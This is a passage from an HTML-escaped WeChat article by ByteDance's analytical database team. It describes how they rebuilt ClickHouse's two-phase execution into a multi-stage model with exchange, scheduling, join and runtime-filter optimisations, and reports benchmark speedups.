            &lt;p data-mpa-powered-by=&quot;yiban.io&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.34629629629629627&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/jC2t9Zib67r1mQp3by2Sld0NkibWF5Vsz1LQe1HgegziaWJguUStKR8snibKMUNeVjHNicJqPIDDJs7osvkLGjRnoBg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;section data-mpa-template=&quot;t&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;blockquote mpa-from-tpl=&quot;t&quot;&gt;&lt;p&gt;&lt;span&gt;ClickHouse作为目前业内主流的列式存储数据库(DBMS)之一，拥有着同类型DBMS难以企及的查询速度。作为该领域中的后起之秀，ClickHouse已凭借其性能优势引领了业内新一轮分析型数据库的热潮。但随着企业业务数据量的不断扩大，在复杂query场景下，ClickHouse容易存在查询异常问题，影响业务正常推进。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;字节跳动作为国内最大规模的ClickHouse使用者，在对ClickHouse的应用与优化过程中积累了大量技术经验。本篇将解析ClickHouse的复杂查询问题，分享字节跳动解决ClickHouse复杂查询问题的优化思路与技术细节。&lt;/span&gt;&lt;strong&gt;&lt;span&gt;关注字节跳动数据平台微信公众号，回复【0711】获得本次分享材料。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;/section&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-backh=&quot;246&quot; data-backw=&quot;578&quot; data-galleryid=&quot;&quot; data-ratio=&quot;0.4255555555555556&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/jC2t9Zib67r0zqoKYFSsJnzMBg18tmmIutUvAt4oFLlYYOn3sfUnPwdQ3BVqzDyHfU3sPTSibWpHt2LKKOWja03A/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;900&quot;/&gt;&lt;strong&gt;&lt;span&gt;文 | 一峰&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span&gt;  &lt;/span&gt;&lt;/strong&gt;&lt;span&gt;来自字节跳动数据平台分析型数据库团队&lt;/span&gt;&lt;/p&gt;&lt;section data-mpa-template=&quot;t&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mpa-template=&quot;t&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.24390243902439024&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/ib745vqibLBGIeAicnHiag9GCzTYjeicic5IWPqfyjLajDuwtJdNCAnCgcolqY8ROaE5CsEXR5zbjCU9aVl3WfkZpnDw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;82&quot;/&gt;&lt;/section&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;p data-mid=&quot;&quot;&gt;&lt;strong mpa-from-tpl=&quot;t&quot;&gt;项目背景&lt;/strong&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;ClickHouse的执行模式与Druid、ES等大数据引擎类似，其基本的查询模式可分为两个阶段。第一阶段，Coordinator在收到查询后，将请求发送给对应的Worker节点。第二阶段，Worker节点完成计算，Coordinator在收到各Worker节点的数据后进行汇聚和处理，并将处理后的结果返回。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-height=&quot;233&quot; data-ratio=&quot;0.5625&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/jC2t9Zib67r0zqoKYFSsJnzMBg18tmmIuspJWoEnaswgKziacwX5sfjIIW6XOWpaYUMIaedkuicuFsKmZ7K9wWdtQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1920&quot; data-width=&quot;414&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;两阶段的执行模式能够较为高效地支持目前许多常见的业务场景，例如各类大宽表单的查询，这也是ClickHouse最擅长的场景。ClickHouse的优点是简单、高效，通常来说，简单就意味着高效。但随着企业业务的持续发展，愈加复杂的业务场景对ClickHouse提出了以下三类挑战。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;strong&gt;&lt;span&gt;第一类，当一阶段返回的数据较多，且二阶段计算较为复杂时，Coordinator会承受较大压力，容易成为Query的瓶颈。&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;例如一些重计算的Agg算子，如Count Distinct，若采用哈希表的方式进行去重，第二阶段需在Coordinator单机上去合并各个Worker的哈希表。这个计算量会很重且无法并行。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;strong&gt;&lt;span&gt;第二类，由于目前ClickHouse模式并不支持Shuffle，因此对于Join而言，右表必须为全量数据。&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;无论是普通Join还是Global Join，当右表的数据量较大时，若将数据都放到内存中，会比较容易OOM。若将数据spill到磁盘，虽然可以解决内存问题，但由于有磁盘 IO 和数据序列化、反序列化的代价，因此查询的性能会受到影响。特别是当Join采用Hash Join时，如果右表是一张大表，构建也会比较慢。针对构建问题，近期社区也进行了一些右表并行构建的优化，数据按照Join key进行Split来并行地构建多个Hash Table，但额外的代价是左右表都需要增加一次Split操作。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;strong&gt;&lt;span&gt;第三类，则是关于复杂查询（如多表 Join、嵌套多个子查询、window function 等），ClickHouse对这类需求场景的支持并不是特别友好，&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;由于ClickHouse并不能通过Shuffle来分散数据增加执行并行度，并且其生成的Pipeline在一些case下并不能充分并行。因此在某些场景下，难以发挥集群的全部资源。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;随着企业业务复杂度的不断提升，复杂查询，特别是有多轮的分布式Join，且有很多agg的计算的需求会越来越强烈。在这种情况下，业务并不希望所有的Query都按照ClickHouse擅长的模式进行，即通过上游数据 ETL 来产生大宽表。这样做对ETL的成本较大，并且可能会有一些数据冗余。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-height=&quot;233&quot; data-ratio=&quot;0.5625&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/jC2t9Zib67r0zqoKYFSsJnzMBg18tmmIuYoNNZha5MwF2omhhPSzvEicemtaJqept0cRuNko9B41ia2ZMicteNaNdg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1920&quot; data-width=&quot;414&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;企业的集群资源是有限的，但整体的数据量会持续增长，因此在这种情况下，我们希望能够充分地去利用机器的资源，来应对这种越来越复杂的业务场景和SQL。所以我们的目标是基于ClickHouse能够高效支持复杂查询。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/section&gt;&lt;section data-mpa-template=&quot;t&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mpa-template=&quot;t&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.24390243902439024&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/ib745vqibLBGIeAicnHiag9GCzTYjeicic5IWPqfyjLajDuwtJdNCAnCgcolqY8ROaE5CsEXR5zbjCU9aVl3WfkZpnDw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;82&quot;/&gt;&lt;/section&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;p data-mid=&quot;&quot;&gt;&lt;strong&gt;技术方案&lt;/strong&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;对于ClickHouse复杂查询的实现，我们采用了分Stage的执行方式，来替换掉目前ClickHouse的两阶段执行方式。类似于其他的分布式数据库引擎，例如Presto等，会将一个复杂的Query按数据交换情况切分成多个 Stage，各Stage之间则通过Exchange完成数据交换。&lt;strong&gt;Stage之间的数据交换主要有以下三种形式。&lt;/strong&gt;&lt;/span&gt;&lt;/section&gt;&lt;ul start=&quot;1&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;将单个或者多个节点的数据汇聚到一个节点上，称为Gather&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;将同一份数据复制到多个节点上，称为Broadcast或广播&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;section&gt;&lt;span&gt;对于单个Stage执行，继续复用ClickHouse目前底层的执行方式。开发上按照不同功能切分不同模块。各个模块预定接口，减少彼此的依赖与耦合。即使模块发生变动或内部逻辑调整，也不会影响其他模块。其次，对模块采用插件架构，允许模块按照灵活配置支持不同的策略。这样便能够根据不同业务场景实现不同的策略。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-height=&quot;233&quot; data-ratio=&quot;0.5625&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/jC2t9Zib67r0zqoKYFSsJnzMBg18tmmIuDzJibxIsqSe3Ffr2JaCWRJGOU0B2D8u85kKic6jkvPMQicGB0fY7O3IsA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1920&quot; data-width=&quot;414&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;strong&gt;&lt;span&gt;首先，当Coordinator接受复杂的查询以后，&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;它会在当前的语法树的基础上，根据节点类型和数据分布情况，插入Exchange节点，并生成一个分布式Plan。其次，Coordinator节点会根据ExchangeNode类型切分Plan，并生成每个Stage执行计划片段。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;strong&gt;&lt;span&gt;接着，Coordinator节点会调用SegmentScheduler调度器，&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;将各Stage的PlanSegment发送给Worker节点。当Worker接收到PlanSegment后，InterpreterPlanSegment会完成数据的读取和执行，通过ExchangeManager完成数据的交互。最后，Coordinator从最后一轮Stage所对应的ExchangeManager中去读取数据，并返回给Client。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;查询片段调度器SegmentScheduler负责调度查询不同的PlanSegment，根据上下游依赖关系和数据分布，以及Stage并行度和worker分布和状态信息，按照一定的调度策略，将PlanSemgent发给不同的 Worker 节点。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-height=&quot;233&quot; data-ratio=&quot;0.5625&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/jC2t9Zib67r0zqoKYFSsJnzMBg18tmmIuibia0uOpRYyL7TrUywEOlvkEP0PVLDqibXiaux4KHuhqouS79H6LJMuITA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1920&quot; data-width=&quot;414&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;目前而言，我们在进行计划下发和调度时，主要实现了两种策略。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;strong&gt;&lt;span&gt;第一种是依赖调度，&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;根据Stage依赖关系定义拓扑结构，产生DAG图，并根据DAG图调度Stage。依赖调度要等到依赖Stage启动以后，才会调度对应的Stage。例如两表Join，会先调度左右表读取Stage，之后再调度Join这个Stage，因为Join的Stage依赖于左右表的Stage。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;strong&gt;&lt;span&gt;第二种是AllAtOnce策略，&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;先计算每个Stage的相关信息，后一次性调度所有Stage。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;相比而言，这两种策略是在容错、资源使用和延时上去做取舍。第一种策略依赖调度，可以实现更好的容错。由于ClickHouse数据可以有多个副本，读数据时，如部分节点连接失败，可以尝试它的副本节点。对后续依赖的节点的Stage来说，并不需要感知到前面 Stage 的执行情况。非Source Stage，本身没有对数据的依赖，所以容错能力会更强，只要保证Stage并行度的节点存活即可。甚至极端情况下，如需保证Query正常执行，也可以降低Stage的并行度。但调度存在依赖关系，并不能完全并行，会增加调度的时长。Stage较多的情况下，调度延时可能会占据SQL整体不小的比例。针对上述问题的可做如下优化：对于一些没有依赖关系的，尽可能支持并行。例如同一个Stage的不同节点，可以并行。没有依赖关系的Stage，也可以并行。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;第二种调度策略是AllAtOnce，通过并行可以极大降低调度延时。为防止出现大量网络IO线程，可以通过异步化手段控制线程数目。AllAtOnce策略的缺点是容错性没有依赖调度好，每一个Stage的Worker在调度前就已经确定了，调度过程中有一个Worker出现连接异常，则整个Query都会失败。另一类情况，Stage在上游数据还没有ready，就被调度起来了，则需要较长时间等数据。例如Final的agg Stage，要等Partial agg完成以后才能够拿到对应的数据。虽然我们也对此进行了一些优化，并不会长时间空跑，浪费CPU资源。但是其实也消耗了一部分资源，例如需要去创建这些执行的线程。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;ClickHouse的查询节点执行主要是以SQL形式在节点间互相交互。在切分Stage后，我们需要支持能够执行一个单独的PlanSegment的执行计划。因此，InterpreterPlanSegment主要的作用就是接受一个序列化后的PlanSegment，能够在Worker节点上去运行整个PlanSegment的逻辑。此外，我们也进行了功能和性能上的增强，例如支持一个Stage处理多个Join，这样便可以减少Stage的数目和一些不必要的传输，用一个Stage就可以完成整个Join的过程。InterpreterPlanSegment的执行会上报对应的状态信息，如出现执行异常，会将异常信息报告给查询片段调度器，调度器会取消Query其他的Stage的Worker执行。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;ExchangeManager是PlanSegment数据交换的媒介，能平衡数据上下游处理的能力。整体而言，我们的设计采用Push与队列的方式，当上游的数据ready时，主动推送给下游，并在这个基础上支持了反压的能力。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-height=&quot;233&quot; data-ratio=&quot;0.5625&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/jC2t9Zib67r0zqoKYFSsJnzMBg18tmmIu69M8c57d8ZOn3FlTqJFI7plaUIwNYJThS1r85044fnicuPJKe8oSgvg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1920&quot; data-width=&quot;414&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;在整个流程中，上下游都会通过队列来优化发送和读取，上游与下游会有一个自己的队列。当队列饱和的时候，会通过类似反压的机制来控制上游这个执行速度，若上游计算快，下游处理能力比较慢，出现下游处理不过来的情况，则会通过反压的方式来控制上游执行的速度。&lt;/span&gt;&lt;br/&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;由于采用push和队列，因此要考虑一个相对比较特殊的场景，在某些case的情况下，下游的Stage并不需要读取全部的上游的数据。例如Limit100，下游只需读取100条数据，而上游可能会产生非常大规模的数据。因此在这种情况下，当下游的Stage读取到足够的数据后，它需要能够主动取消上游Stage的执行，并且清空队列。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;strong&gt;&lt;span&gt;ExchangeManager考虑的优化点较多，&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;例如细粒度的内存控制，能够按照实例、Query、Segment等多个层次进行内存控制，避免OOM。更长期的考虑是在一些对延迟要求不高、数据量大的场景，通过将数据 Spill 到磁盘，降低内存的使用&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-height=&quot;233&quot; data-ratio=&quot;0.5625&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/jC2t9Zib67r0zqoKYFSsJnzMBg18tmmIuHuia1oxFyZibxfqT9Dv2ywUPzGpAKGm7D60nGlyLRB7hOq7ib06YabibaA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1920&quot; data-width=&quot;414&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;strong&gt;&lt;span&gt;第二，为了提升传输效率，小数据要做Merge，大数据要做Split。&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;同时，在网络传输和处理某些场景的时候，需要做一种有序性的保证。例如在Sort的场景，Partial Sort和Merge Sort的网络传输过程必须要保证是有序的，传输数据不能出现乱序的情况，否则进行Merge Sort时数据就会出问题，并影响最终结果。&lt;/span&gt;&lt;br/&gt;&lt;/section&gt;&lt;section&gt;&lt;strong&gt;&lt;span&gt;第三，连接的复用和网络的优化，&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;包括上下游在同一个节点，尽可能走内存交换，而不走网络。这样可以减少网络开销以及数据的序列化和反序列化的代价。此外，ClickHouse在计算上做了非常充足的优化，因此其在某些场景中，内存带宽会成为瓶颈，在ExchangeManager的一些场景中，可以用一些零拷贝和其他优化，尽量减少内存的拷贝。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;strong&gt;&lt;span&gt;第四，异常处理和监控。&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;相比于单机，分布式情况下异常情况会更加复杂，且更加难以感知。通过重试能够避免一些节点短时性的高负载或者异常对查询的影响。做好监控，在出问题的时候，能快速感知，并进行排查，也能够针对性地去做优化。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/section&gt;&lt;section data-mpa-template=&quot;t&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.24390243902439024&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/ib745vqibLBGIeAicnHiag9GCzTYjeicic5IWPqfyjLajDuwtJdNCAnCgcolqY8ROaE5CsEXR5zbjCU9aVl3WfkZpnDw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;82&quot;/&gt;&lt;/section&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;p data-mid=&quot;&quot;&gt;&lt;strong&gt;优化与诊断&lt;/strong&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;首先是Join的多种实现和优化。&lt;strong&gt;根据数据的规模和分布，可以根据不同的场景去选择合适的Join的实现方式：&lt;/strong&gt;&lt;/span&gt;&lt;/section&gt;&lt;ul start=&quot;1&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;Shuffle Join，是目前使用方式最多，也是最常见的。&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul start=&quot;1&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;Broadcast Join，大表Join小表场景，将右表广播到左表的所有Worker节点上面，这样可以避免左表大表的数据传输。&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;Colocate Join，如果左右表都已按照Join key分布，并且它们是相通的分布的话，其实不需要去做数据的exchange，可以将数据的传输减到最小。&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;section&gt;&lt;span&gt;网络连接的优化，核心本质是减少连接的建立和使用，特别是在数据需要Shuffle时，下一轮Stage中的每一个节点都要从上游的Stage中的每个节点去拉取数据。若集群整体的节点数较多，且存在很多较复杂的Query，就会建立非常多的连接。&lt;/span&gt;&lt;/section&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-height=&quot;233&quot; data-ratio=&quot;0.5625&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/jC2t9Zib67r0zqoKYFSsJnzMBg18tmmIuh6OLqa8dCDRgpMUrSAWs0miaJokicKjL10U7iazCOJH42EdzECibPyg38g/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1920&quot; data-width=&quot;414&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;目前在字节内部，ClickHouse集群的规模非常大，在当前 ClickHouse 二阶段执行的高并发情况下，单机最大可能会建立几万个连接。因此必须要进行网络连接的优化，特别是支持连接的复用，每个连接上可以跑多个Stage查询。通过尽可能去复用连接，在不同的节点之间，能够建立固定数目的连接，不同的Query、Stage都会复用这些连接，连接数并不会随着Query和Stage的规模的增长而增长。&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;网络传输优化，在数据中心内，远程的直接的内存访问，通常指RDMA，是一种能够超过远程主机操作系统的内核，去访问内存里的数据的技术。由于这种技术不需要经过操作系统，所以不仅节省了大量的CPU资源，同样也提升了系统吞吐量，降低了系统的网络通信延迟，尤其适合大规模并行的计算机集群。由于 ClickHouse 在计算层面做了很多优化，而网络带宽相比于内存带宽要小不少，在一些数据量传输特别大的场景，网络传输会成为一定的瓶颈。为了提升网络传输的效率和提升数据 exchange 的吞吐，一方面可以引入压缩来降低传输数据量，另一方面可以引入 RDMA 来减少一定的开销。经过测试，在一些数据传输量大的场景，有不小的收益。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;利用Runtime Filter的优化在不少数据库也有使用。&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;Join的算子通常是OLAP引擎里最耗时的算子，优化Join算子有两种思路。一种思路是可以提升Join算子的性能。比如对于 HashJoin，可以优化 HashTable 实现，也可以实现更好的哈希算法，包括做一些更好的并行的方式。&lt;/span&gt;&lt;/p&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-height=&quot;233&quot; data-ratio=&quot;0.5625&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/jC2t9Zib67r0zqoKYFSsJnzMBg18tmmIuXZlGiaZtANHaXOBJ5AwIqA7Ln8KF1cSAYfUn1Iazu8zFMkdJleN6MSQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1920&quot; data-width=&quot;414&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;strong&gt;&lt;span&gt;另一种思路是，如果本身算子耗时比较重，可以减少参与算子计算的数据。&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;Runtime Filter是在一些场景下特别是事实表Join多张维度表的星型模型场景有比较好的效果。在此类场景下，通常事实表的规模会非常大，而大部分的过滤条件都是在维度表上面。&lt;/span&gt;&lt;br/&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;Runtime Filter的作用，是通过在Join的Probe端，提前过滤掉并不会命中Join条件的输入数据，从而大幅减少Join中的数据传输和计算。通过这种方式，能够减少整体的执行时间。因此我们在复杂查询上也支持了Runtime Filter，目前主要支持Min Max和Bloom Filter。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;如果 runtime filter 的列（join column）构建了索引（主键、skip index…），是需要重新生成 pipeline 的。因为命中索引后，可能会减少数据的读取，pipeline 并行度和对应数据的处理 range 都可能发生变化。如果 runtime filter 的列跟索引无关，可以在计划生成的时候预先带上过滤条件，一开始为空，只是占位，runtime filter 下发的时候把占位信息改成真正的过滤条件即可。这样即使 runtime filter 下发超时了，查询片段已经开始执行，只要查询片段没有执行完，之后的数据仍然可以进行过滤。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;strong&gt;&lt;span&gt;但需要注意的是，Runtime Filter是一种特殊场景下的优化，针对场景是右表数据量不大，并且构建的Runtime Filter对左表有比较好的过滤效果。&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;若右表数据量较大，构建的Runtime Filter的时间比较久，或对左表的数据过滤没有效果。Runtime Filter反而会增加查询的耗时和计算的开销。因此要根据数据的特征和规模来决定是否开启优化。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;性能诊断和分析对复杂查询很关键，由于引入了复杂查询的多Stage模型，SQL执行的模式会变得复杂。&lt;strong&gt;对此的优化首先是尽可能完善各类Metrics，&lt;/strong&gt;包括Query执行时间、不同Stage执行时间、起始时间、结束时间、处理的IO数据量、算子处理的数据、执行情况，以及各类的算子Metrics和一些Profile Events（例如Runtime Filter会有构建时间、过滤数据量等Metrics）。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;strong&gt;&lt;span&gt;其次，我们记录了反压信息与上下游的队列长度，&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;以此推断Stage的执行情况和瓶颈。&lt;/span&gt;&lt;span&gt;通常可以有如下判断：&lt;/span&gt;&lt;/section&gt;&lt;ul class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;输入和输出队列数目同为低或同为高分别表明当前 stage 处理正常或处于被下游反压，此时可以通过反压信息来进一步判断。&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;当输入和输出队列数目不一样，这可能是出于反压传导的中间状态或者该 stage 就是反压的根源。&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;如果一个 stage 的输出队列数目很多，且经常被反压，通常是被下游 stage 所影响，所以可以排除它本身是反压根源的可能性，更多关注它的下游。&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;span&gt;如果一个 stage 的输出队列数目很少，但其输入队列的数目很高，则表明它有可能是反压的根源。优化目标是提升这个 stage 的处理能力。&lt;/span&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;section&gt;&lt;strong&gt;&lt;span&gt;总的来说，SQL的场景包罗万象，非常复杂的场景有时还是需要对引擎有一定了解的同学去诊断和分析，给出优化建议。&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;字节目前也在不断完善这些经验，希望能够通过不断完善Metrics和分析的路径，持续减轻Oncall的负担，在某些场景下能够更加准确地给出优化建议。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/section&gt;&lt;section data-mpa-template=&quot;t&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.24390243902439024&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/ib745vqibLBGIeAicnHiag9GCzTYjeicic5IWPqfyjLajDuwtJdNCAnCgcolqY8ROaE5CsEXR5zbjCU9aVl3WfkZpnDw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;82&quot;/&gt;&lt;/section&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;section data-mid=&quot;&quot; mpa-from-tpl=&quot;t&quot;&gt;&lt;p data-mid=&quot;&quot;&gt;&lt;strong&gt;效果与展望&lt;/strong&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;根据上述所提，目前执行模型存在三个缺点，我们进行了复杂查询的优化，因此需要验证这种新的模式是否能够解决发现的问题，&lt;strong&gt;测试场景如下：&lt;/strong&gt;&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;以SSB 1T数据作为数据集，环境则是构建了8个节点的集群。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;strong&gt;&lt;span&gt;Case1——二阶段计算复杂。&lt;/span&gt;&lt;/strong&gt;&lt;span/&gt;&lt;span&gt;我们看到有一个比较重的计算算子UniqExact，就是&lt;/span&gt;&lt;span&gt;count distinct&lt;/span&gt;&lt;span&gt;的计算方式，通过Hash表做去重。&lt;/span&gt;&lt;span&gt;count distinct默认&lt;/span&gt;&lt;span&gt;采用&lt;/span&gt;&lt;span&gt;这种算法，当我们使用复杂查询后，Query的执行时间从8.5秒减少到2.198秒&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;span&gt;第二阶段 agg uniqExact 算子的合并原本由coordinator单点合并，现在通过按照group by key 